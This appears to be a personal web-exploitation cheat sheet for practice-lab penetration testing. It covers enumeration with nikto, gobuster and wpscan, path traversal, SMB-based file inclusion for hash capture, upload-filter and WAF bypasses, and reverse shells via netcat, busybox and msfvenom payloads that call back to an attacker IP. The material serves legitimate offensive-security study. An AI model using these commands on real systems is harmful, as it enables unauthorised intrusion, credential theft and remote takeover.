# HTTP and HTTPS

usually the likely attack vector (But can be a rabbit hole as well so dont fall in love with it!)

- Might sound silly but might want to try putting https instead of http if there is nothing going on.

- check the source code, robots.txt. can also run inspect to see whats going on in the background

- If GET doesn't work, why not POST! (see Nickel box on PG)

- if need be, fire up burp suite or Inspect the page

- try to find the CN (which you can use dig for)

- Do basic website scans using both whatweb and nikto

```bash
sudo nikto --host <target>:<port> 

# if basic auth

-id <user>:<password>
```

- Google the CMS, web services for potential easy wins exploit (use searchsploit or exploit-db or google as last resort)
	- Apache 2.4.49 - vuln to dir traversal and RCE

some websites dont work properly if you use the ip address. This may be because the hostname is being referenced in the webpage instead of the IP Address. Consider adding an entry to /etc/hosts if you find anything that looks like a hostname.


```bash
sudo nano /etc/hosts

# add an entry to the last line
<ip> <domain>

```
Manual Enumeration (go to website and click around):

	- Check for usernames, potential domains
	- Check for places where you can upload files
	- check for places where you can provide user input
		- try SQL ' or "
		- if it works, throw xp_cmdshell and try to get a reverse shell (if it is windows)
		- if not, enumerate the table
	- If login pages, try default credentials (try with uppercase as well!)
		- admin:admin
		- admin:password
		- root:root
		- root:toor
		- username:username ( if you find a username)

## Hey It's WordPress!

- Auto Enum:
	- if wordpress, run wpscan. 
	- if xmlrpc is enabled, use this https://github.com/relarizky/wpxploit
	- Always check out the wp-contents/uploads folder. Might have interesting things inside

```bash
# make sure you get the token from wpscan website! You will need to create a user account
wpscan --url http://<domain> --enumerate ap --plugins-detection aggressive -o websrv1/wpscan

# if https, add the --disable-tls-checks
# to enum users, add --enumerate u
# if you have a user, add --usernames <username> to brute force, -U <user list>, --passwords <wordlist like rockyou>
```

see if you can upload files via the media or the plugins tab.
- For plugins may need to upload as a zip
- files are uploaded to /wp-content/uploads
- Some good content here on how to get a revshell if you can get into the management panel https://www.hackingarticles.in/wordpress-reverse-shell/

---------------------
## Directory Busting

- Always dirbust and nikto
- The choice of wordlist can be important. What I find useful are: (can be found in /usr/share/wordlists/seclists/Discovery/Web-Content/)
	- Seclists's big.txt, medium directory (with this you should put in the extension flags as well or you may miss things!)
	- Seclists raft medium directory, files
```bash

nikto -h <ip> -C all

gobuster dir -u http://<target ip> -w <use the seclists dir list> -t 50 --no-error -x config, txt, pdf

# if https. -k to skip SSL errors

gobuster dir -u https://<target ip> -w <seclist> -t 50 -k --no-error

# if page is running things like php or aspx, add -x flag. you an often find things like admin.php

gobuster dir -u http://<target ip> -w <use the seclists dir list> -t 50 --no-error -x php, aspx

# also 

# if any interesting directories, further gobust those

# feroxbuster is pretty cool as well!

feroxbuster -u <target> -x txt,pdf,conf,php,aspx (edit the extensions as needed)

```
- if you find any .git folders, download them!

```bash

# download .git repo

wget -r http://<ip>/.git 

# note the above may not work if you get 403. Instead use git-dumper!

git-dumper http://<ip>/.git <output folder>

git diff

git log

# investigate interesting logs by using

git show 'commit id'
```
- try looking for these sensitive config files:
	- Apache - config.php (may need to path traverse to /etc/apache2), phpmyinfo (reveals interesting information)
		- run dirbuster and see if you can find phpinfo. Identify the root of the directory!
	- wp - wp-config.php
	- if you have path traverse or rce, try looking for rsa keys. You may need to check what kinds of keys are there as it is not always id_rsa; you can do this by checking out the /home/target user/.ssh/authorized_keys file. ecdsa keys have a diff name from id_rsa (id_ecdsa) 
- if you see things like parameters in the url, you should try path traversal
- Also use burp suite to intercept and view responses. The web app may not always be able to respond in the way you expect!

```bash

domain.com/abc/?news=a

# try

?news=../../../../../../etc/passwd

?news=C:/Windows/System32/drivers/etc/hosts

# check for File inclusion esp if it is a Windows MAchine!

start up a impacket smbserver on your attacker

?page=//<attacker ip>/<share>/anything.txt

capture the NTLMv2 hash

# if hash cannot crack

then host a malicious php file and then smbserver again and then

?page=//<attacker ip>/<share>/evil.php

```
once you find some way to upload stuff, see if you can upload php or aspx files from your prepared Tools folders

## Bypassing File Upload filters

- try simple manipulation of the file extension. For e.g if php, try pHp or pHP.

- try other versions of it like php2, phtml etc

- rename your .php to the relevant file format such .pdf. Intercept the upload request and rename the file back to .php and forward. Might work.

- try appending the legit extension and see if it tricks the system. like abc.pdf.php or abc.php.pdf

- try appending the magic bytes to the malicious script to trick the system. To do this use burpsuite to intercept the upload and then add the magic bytes in the body.

- change the file format header to application/pdf to see if it fools the system

- If there is a WAF in effect, you can intercept the request and add the following headers to the POST request:

From BurpSuite

https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c

these following headers can be added to your request to attempt to bypass WAF.

Be sure to add this before the Priority header or else it will hang!

```bash

X-Originating-IP: 127.0.0.1 
X-Forwarded-For: 127.0.0.1 
X-Remote-IP: 127.0.0.1 
X-Remote-Addr: 127.0.0.1

```
----------------------------------------------
## I got a Webshell! or did I?

 if your shell is part of a multi staged exploit i.e where the exploit script downloads the shell file from you and then executes it on the target, see if the exploit script has a sleep function. lengthen the sleep function to like 10 seconds or something because it takes a while to fully download your shell script

- some boxes have firewalls rules so you may need to change your revshell lport to something common like port 80 or 443 to be safe. you can also consider using existing open ports on the target (egress traffic might be open)

- For Wordpress, uploaded stuff are usually in wp-content

- sometimes a direct php revshell would not work. Try a php backdoor shell first and then use it to execute a netcat reverse shell

- is your nc rev shell not working? perhaps the nc on the system is an older version and does not support the -e flag. 
    - To test this, try just running nc <attacker ip> <port>. If you get a connection back, then do the following and you should get a nc revshell

```bash
busybox nc <attacker ip> <port> -e /bin/bash 
```

- Once you pop your web shell, it is usually a "weak" shell that may have issues executing follow on exploits. if it linux, upgrade your shell first (needs python)

```bash
# change to /bin/sh if it doesnt work
python3 -c "import pty;pty.spawn('/bin/bash');"

python3 -c 'import os; os.system("/bin/bash");'
```
- once upgraded, consider using either native nc (which may not work because of your weak shell) or upload a msfvenom shell and execute that to gain a more stable shell

```bash

msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<port> -f exe > abc.exe 

msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your ip> LPORT=<port> -f elf > abc.elf 

```
- if you enter via a web-service, you should ENUMERATE the /var/www/html folder for creds